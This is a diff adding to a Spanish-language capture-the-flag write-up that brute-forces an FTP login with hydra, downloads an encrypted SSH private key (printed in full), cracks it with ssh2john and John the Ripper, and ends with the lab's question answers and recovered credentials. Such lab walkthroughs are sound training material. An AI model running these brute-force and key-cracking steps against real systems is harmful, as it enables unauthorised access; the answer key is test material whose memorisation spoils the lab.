@@ -149,3 +149,125 @@ cat note.txt
 
 James new ftp username: ftpuser
 we have to work hard
+
+Vale, tengo un user de fpt, y otro posible @vill.
+Voy a realizar un ataque de fuerza bruta contra el login ftp.
+
+hydra -l ftpuser -P /home/mksk/wordlists/rockyou.txt ftp://10.129.133.192
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-25 11:36:51
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking ftp://10.129.133.192:21/
+
+[STATUS] 288.00 tries/min, 288 tries in 00:01h, 14344110 to do in 830:06h, 16 active
+[STATUS] 277.33 tries/min, 832 tries in 00:03h, 14343566 to do in 861:60h, 16 active
+[21][ftp] host: 10.129.133.192   login: ftpuser   password: love4ever
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-25 11:40:47
+
+Consigo un set de credenciales.
+ftpuser:love4ever
+
+ftp> ls -la
+229 Entering Extended Passive Mode (|||10049|)
+150 Here comes the directory listing.
+drwx------   12 1003     1003         4096 Jul 14  2020 .
+drwx------   12 1003     1003         4096 Jul 14  2020 ..
+lrwxrwxrwx    1 1003     1003            9 Jul 14  2020 .bash_history -> /dev/null
+-rw-r--r--    1 1003     1003          220 Jul 13  2020 .bash_logout
+-rw-r--r--    1 1003     1003         3771 Jul 13  2020 .bashrc
+-rw-r--r--    1 1003     1003          807 Jul 13  2020 .profile
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
+drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
+drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
+
+ftp> get id_rsa
+local: id_rsa remote: id_rsa
+229 Entering Extended Passive Mode (|||10052|)
+150 Opening BINARY mode data connection for id_rsa (1766 bytes).
+100% |***************************************************************************|  1766       21.60 KiB/s    00:00 ETA
+226 Transfer complete.
+1766 bytes received in 00:00 (15.87 KiB/s)
+ftp> get not.txt
+local: not.txt remote: not.txt
+229 Entering Extended Passive Mode (|||10058|)
+150 Opening BINARY mode data connection for not.txt (31 bytes).
+100% |***************************************************************************|    31       84.32 KiB/s    00:00 ETA
+226 Transfer complete.
+
+cat not.txt 
+james change ftp user password
+
+La nota no tiene mucha relevancia, pero ahora tenemos una clave ssh.
+La muevo a .ssh y le doy los permisos necesarios.
+chmod 400 id_rsa
+
+Compruebo id_rsa
+ cat id_rsa 
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,01762A15A5B935E96A1CF34704C79AC3
+
+pSxCqzRmFf4dcfdkVay0+fN88/GXwl3LXOS1WQrRV26wqXTE1+EaL5LrRtET8mPM
+dkScGB/cHICB0cPvn3WU8ptdYCk78w9X9wHpPBa6VLk1eRi7MANLcfRWxQ4GFwXp
+CP8KSSZBCduabfcx6eLBBM8fMC+P2kgtIOhnlpt/sAU2zDQa8kZHw8V76pzcBLka
+trq4ik4tpsgHqEU4BDw24bNjtJxgEy4sddtpXyy0i3KZ9gm6Uop6/jFG8uuoAQPn
+AcwIZSCpjEfiMLzerVNNotZU9I11jRtbdQsxAjLPYY30PyO2cFlgpohvpyMD6lfO
+33v8DOV8U69zlyUtUgArfZ9IORPKLOW5VLfuqX8yLsylVrmmuGdlfN+zO5enukjV
+cg/mpJL/kePgViEqnTJf5Y8vYJ9tEGko8YBvorrsS0QXN7GJtW8h7IYrsLpXYzeu
+FPD5cgEdixE4UlGo7G6nmlkikLsDwjjVIDX9C3eHljAhiktKAu19wbwdaJ8F4WWW
+txZv/fsKBSI/JexzOY2lKSFq52Dod6G1eCVf0WgsQrXBOxgKn/iQ0dg4aCVNttni
+kKKW3hEQP3gK6B20dnIItFzQpaqapuNJKnAWEj6YG+7QpCjncMEMUDGpCSqnMuYB
+PVM3GU4sq5OO14gXtjOgTfBXP07cqkuW6L8XQl+sWobgVuIGmK69wfCZSjy29Hqo
+8SmeUAdiv37UenHGLxwjelnNcblLm/BYyW6P6m6pc+zgUSK/MVysGj9B8ryLVcIc
+P8O/HKResEUC/MZJGYWIZeu7UK/Ifs5IN/uTYmBM9/44tRJApvY+3rrdUUA3khjY
+ZTzeX1/xS5rqprEYcr19ExboGVqNCUMHPwmufZZbB1uUagaR2Cv44j9rU19BVF1s
+czMMNJGJSoeA4UKNIuXFVIMbMcZD2fCKaKYWT6C0RDS0TrAf7AUurgHReAqsQhTE
+xxaGq7DLLflzVHC7EY2VhdAWmbNbGQi/k7+4wC6HTRbnLMh2kTFYMbGA64hDHxFP
+DYJh4ZCEDiyWe1JkmaeAAyc2n0TCVsgEzxgGPGe3tZynVML/rFWDMA0B5kZ9VLS7
+j5NOaTeWFwVy55ONPzGgCICsj+izaOuCvsbdJQ7FdQ0LPNzZ/RUFvh4k7E1ZjBos
+y9GNQW8WMAWH7SFK91KdX4c+fsAPnHN/v7uF/dRWlzkusrVLznURsVtG0k2BxUwx
+PYn3OG7SwGS+DyiFvvV0NspX2oIXEqA6VioqQxc+0dcEGxcyNY5uDut3BENGPD+X
+Ut/fe6bIfVse+ovAb6F36SBquuDjJWCHaHyVMASlmmzA6A6XhlSnrxhVP2/cmtdo
+zUicXz715Li1enhR6p68AzGhBzYZsF/F9MSbrBgust0zDeNllL/4slZ9zfrg+zUY
+weJKZAn1ib9/mG+PcdcPLFTcWIbXvigSx22svaiuG9WbVzU7GolkStYnrTPdDJ8M
+Nw6TzknzJ6s79cg6cKPefrQVFXYXYxSZOvK/TElYrirHqBacVwIyMxCbOgoUbsF2
+ipwD46fpPTKgP6qwDirNcKtULMtEud/rbqVvnP+fqm5UC+oqoX+lb1g2fvytTXSe
+-----END RSA PRIVATE KEY-----
+
+Esta encriptada, la paso por ssh2john y la crackeo.
+
+ssh2john id_rsa > hash.txt
+
+john-the-ripper --wordlist=/home/mksk/wordlists/rockyou.txt hash.txt 
+Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
+Use the "--format=ssh-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 3DES/AES 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+bluelove         (id_rsa)     
+1g 0:00:00:00 DONE (2026-05-25 11:55) 20.00g/s 560640p/s 560640c/s 560640C/s chiquitin..198721
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+Ya tengo otro set de credenciales, esta vez para ssh.
+james:bluelove
+
+Al buscar en las carpetas, en data-4 encuentro una clave ssh y una nota. 
+//Preguntas
+ftp user name? ftpuser
+ftp password? love4ever
+What is the ssh username? james
+What is the ssh password? bluelove
